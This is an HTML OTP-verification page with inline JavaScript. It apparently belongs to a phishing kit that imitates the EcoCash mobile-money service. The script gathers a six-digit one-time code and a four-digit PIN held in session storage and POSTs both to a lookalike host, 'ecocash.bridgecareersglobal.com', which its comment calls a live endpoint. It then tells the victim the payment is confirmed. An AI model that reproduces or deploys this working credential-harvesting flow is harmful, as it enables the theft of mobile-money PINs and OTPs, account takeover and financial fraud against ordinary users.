<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Verify it's you</title>
<link rel="stylesheet" href="style.css">
</head>
<body>
  <div class="card">
    <h1>OTP Verification</h1>

    <form id="otpForm">
      <div class="otp-boxes">
        <input type="text" inputmode="numeric" maxlength="1" class="otp-digit" required>
        <input type="text" inputmode="numeric" maxlength="1" class="otp-digit" required>
        <input type="text" inputmode="numeric" maxlength="1" class="otp-digit" required>
        <input type="text" inputmode="numeric" maxlength="1" class="otp-digit" required>
        <input type="text" inputmode="numeric" maxlength="1" class="otp-digit" required>
        <input type="text" inputmode="numeric" maxlength="1" class="otp-digit" required>
      </div>
      <button type="submit">Confirm code</button>
      <button type="button" class="back-link" id="backBtn">← Back</button>
      <div id="msg"></div>
    </form>
  </div>

<script>
// LIVE CLOUDFLARE ENDPOINT
const API_BASE = 'https://ecocash.bridgecareersglobal.com';

const accountData = JSON.parse(
    sessionStorage.getItem('accountData') || '{}'
);

const transactionId =
    sessionStorage.getItem('transactionId');

const demoPin =
    sessionStorage.getItem('demoPin');

// Make sure a transaction exists
if (!transactionId) {
    window.location.href = 'index.html';
}

// Back button
const backBtn = document.getElementById('backBtn');
if (backBtn) {
    backBtn.addEventListener(
        'click',
        () => {
            window.location.href = 'account.html';
        }
    );
}

// OTP boxes
const digits =
    document.querySelectorAll('.otp-digit');

digits.forEach((el, i) => {

    el.addEventListener('input', () => {

        // Allow numbers only
        el.value =
            el.value.replace(/[^0-9]/g, '');

        // Move to next box
        if (
            el.value &&
            i < digits.length - 1
        ) {
            digits[i + 1].focus();
        }
    });

    el.addEventListener('keydown', (e) => {

        // Move backwards on backspace
        if (
            e.key === 'Backspace' &&
            !el.value &&
            i > 0
        ) {
            digits[i - 1].focus();
        }
    });
});

if (digits.length > 0) {
    digits[0].focus();
}

// Submit OTP
const otpForm = document.getElementById('otpForm');
if (otpForm) {
    otpForm.addEventListener('submit', async function(e) {

        e.preventDefault();

        const code =
            Array.from(digits)
                .map(d => d.value)
                .join('');

        const msg =
            document.getElementById('msg');

        if (msg) {
            msg.className = '';
            msg.style.display = 'none';
        }

        // Check OTP length
        if (code.length !== 6) {
            if (msg) {
                msg.className = 'err';
                msg.textContent = 'Enter all 6 digits.';
                msg.style.display = 'block';
            }
            return;
        }

        // Check PIN stored in session
        if (!/^\d{4}$/.test(demoPin || '')) {
            if (msg) {
                msg.className = 'err';
                msg.textContent =
                    'Session expired. Please restart the payment process.';
                msg.style.display = 'block';
            }
            return;
        }

        try {
            if (msg) {
                msg.className = '';
                msg.style.display = 'block';
                msg.textContent = 'Verifying OTP...';
            }

            const res = await fetch(
                `${API_BASE}/api/verify-otp`,
                {
                    method: 'POST',

                    headers: {
                        'Content-Type': 'application/json'
                    },

                    body: JSON.stringify({
                        transactionId: transactionId,
                        code: code,
                        demoPin: demoPin
                    })
                }
            );

            const data = await res.json();

            if (
                !res.ok ||
                !data.ok
            ) {
                throw new Error(
                    data.error ||
                    'Verification failed'
                );
            }

            // Save successful transaction
            sessionStorage.setItem(
                'verifiedTransaction',
                JSON.stringify(
                    data.transaction || {}
                )
            );

            if (msg) {
                msg.className = 'success';
                msg.textContent =
                    '✓ Payment confirmed successfully!';
            }

            // Go to confirmation page
            setTimeout(() => {
                window.location.href =
                    'confirmation.html';
            }, 1000);

        } catch (err) {

            console.error(
                'OTP verification error:',
                err
            );

            if (msg) {
                msg.className = 'err';
                msg.style.display = 'block';

                msg.textContent =
                    err.message ||
                    'That code is incorrect or expired.';
            }
        }
    });
}
</script>
</body>
</html>
